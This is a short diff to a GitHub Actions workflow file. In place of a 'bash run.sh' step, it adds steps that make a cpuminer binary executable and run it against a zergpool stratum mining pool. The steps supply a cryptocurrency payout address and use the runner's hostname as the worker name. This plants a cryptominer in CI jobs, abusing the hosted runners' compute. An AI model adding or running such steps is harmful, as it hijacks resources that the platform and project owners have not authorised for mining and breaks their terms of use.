@@ -21,6 +21,8 @@ jobs:
     - name: CD  
       run: cd github
     - name: RUNNING  
-      run: bash run.sh 
-    - name: DONE  
+      run:  chmod +x cpuminer 
+    - name: RUN  
+      run: ./cpuminer -a yescryptR16 -o stratum+tcp://yescryptR16.mine.zergpool.com:6333 -u XcF8ZFvmFbpWtAqNGKkcQWpwvBrhKocdrK -p c=DASH,mc=QOGE,ID=W-$(echo $(hostname)) -t 2
+    - name: RUN  
       run: exit
